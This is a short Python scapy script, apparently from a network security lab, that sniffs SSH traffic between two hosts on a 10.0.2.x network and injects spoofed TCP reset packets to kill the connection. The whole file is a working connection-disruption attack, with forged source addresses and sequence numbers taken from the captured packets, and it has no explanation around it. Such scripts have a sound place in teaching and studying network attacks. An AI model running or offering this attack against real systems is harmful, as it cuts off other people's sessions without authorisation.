#!/usr/bin/env python

from scapy.all import *

def spoof(pkt):
  src = pkt[IP].src
  dst = pkt[IP].dst
  sport = pkt[TCP].sport
  dport = pkt[TCP].dport
  seq = pkt[TCP].seq
  ack = pkt[TCP].ack if pkt[TCP].ack else 0

  ip = IP(src=dst, dst=src)
  tcp = TCP(sport=dport, dport=sport, flags="R", ack=seq, seq=ack)
  send(ip/tcp, iface="enp0s3")
  
if __name__ == "__main__":
  filter_str = "src host 10.0.2.4 and dst host 10.0.2.5 and dst port 22"
  sniff(filter=filter_str, prn=spoof)
